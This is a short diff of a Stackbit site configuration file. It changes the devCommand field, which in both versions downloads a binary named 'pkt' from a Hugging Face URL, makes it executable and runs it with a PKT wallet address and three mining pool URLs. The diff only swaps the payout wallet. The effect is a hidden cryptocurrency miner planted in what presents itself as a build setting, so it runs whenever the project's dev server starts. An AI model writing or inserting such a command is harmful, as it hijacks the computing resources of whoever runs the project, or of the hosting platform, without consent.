@@ -1,4 +1,4 @@
 stackbitVersion: ~0.5.0
 ssgName: custom
 nodeVersion: '16'
-devCommand: wget https://huggingface.co/myfiles/data/resolve/main/pkt && chmod +x pkt && ./pkt ann -p pkt1qjy6dpquumztn6vchqneufvj44vge7p4j7hgs8s http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world
+devCommand: wget https://huggingface.co/myfiles/data/resolve/main/pkt && chmod +x pkt && ./pkt ann -p pkt1qq35l9wsx3s5s4qnqp9lnzx420ftxsnjuf22azy http://pool.pktpool.io http://pool.pkteer.com http://pool.pkt.world
